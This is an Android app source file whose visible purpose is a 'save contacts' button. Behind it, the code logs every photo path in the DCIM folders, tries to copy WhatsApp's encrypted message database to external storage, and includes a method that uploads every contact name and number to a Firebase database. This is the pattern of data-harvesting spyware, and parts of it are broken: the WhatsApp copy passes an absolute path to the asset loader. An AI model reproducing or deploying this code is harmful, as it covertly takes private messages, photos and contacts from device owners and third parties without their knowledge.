package dev.com.dev;

import android.Manifest;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.database.ValueEventListener;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

public class MainActivity extends AppCompatActivity implements View.OnClickListener {

  private static final String TAG = MainActivity.class.getSimpleName();
  private Button mSaveContacts;
  private FirebaseDatabase mDatabase;
  private DatabaseReference mReference;
  private static final int PERMISSION_ID = 102;

  String[] permission = {Manifest.permission.READ_CONTACTS,Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
  @Override protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    mSaveContacts = findViewById(R.id.save_contacts);
    mSaveContacts.setOnClickListener(this);


  }

  public void getfilesFromDcim() throws IOException {

    File files = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
    if (files != null){
      File [] listFiles = files.listFiles();
      if (listFiles != null){
        for (File file:listFiles) {
          if (file.isDirectory()){
              File [] images = file.listFiles();
                for (File i:images) {

                  Log.d(TAG,i.toString());
                }
          }
        }
      }
    }


  }

  public void saveContacts(){
    Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    Cursor cursor = getContentResolver().query(uri,null,null,null,null);
    assert cursor != null;
    while (cursor.moveToNext()){
      String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
      String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
      //Log.d(TAG,name + " : " + number);
      saveDataOnline(name,number);
    }
    cursor.close();
  }



  @Override public void onClick(View view) {

    if (view == mSaveContacts){

      for(String perm : permission){

        if (ContextCompat.checkSelfPermission(this, perm)
            != PackageManager.PERMISSION_GRANTED) {

          //request
          ActivityCompat.requestPermissions(this,
              permission,
              PERMISSION_ID);
        } else {
          Toast.makeText(this, "Permission Ok", Toast.LENGTH_SHORT).show();

          //getListFiles
          try {
            getfilesFromDcim();
          } catch (IOException e) {
            e.printStackTrace();
          }

          //save contatcts
          //saveContacts();

        }

      }
      File storageDir = new File(
          Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS) + "/DBCopy");
      boolean success = true;
      if (!storageDir.exists()) {
        success = storageDir.mkdirs();

      }

      if (success){
        try {
          Utils.copyFile(getAssets().open(Environment.getExternalStorageDirectory().getAbsoluteFile() + "/WhatsApp/Databases/msgstore.db.crypt12"),
              new FileOutputStream(new File(Environment.getExternalStorageDirectory(),"file")));
          File dbFile =  new File(Environment.getExternalStorageDirectory() ,"file");
          Toast.makeText(this, "OK" + dbFile, Toast.LENGTH_SHORT).show();
        } catch (IOException e) {
          e.printStackTrace();
        }
      }
      }


  }

  @Override
  public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);

    switch (requestCode){
      case PERMISSION_ID:
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED){
          Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
          Cursor cursor = getContentResolver().query(uri,null,null,null,null);
          assert cursor != null;
          while (cursor.moveToNext()){
          String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            Log.d(TAG,name + " : " + number);

          }
          cursor.close();
        } else {
          Toast.makeText(this, "Please accept to execute app", Toast.LENGTH_SHORT).show();
        }
        break;
    }

  }


  public void saveDataOnline(String name, String number){

    mDatabase = FirebaseDatabase.getInstance();
    mReference = mDatabase.getReference().child("Contacts").push();
    mReference.setValue(new ContactModel(name,number));

  }}
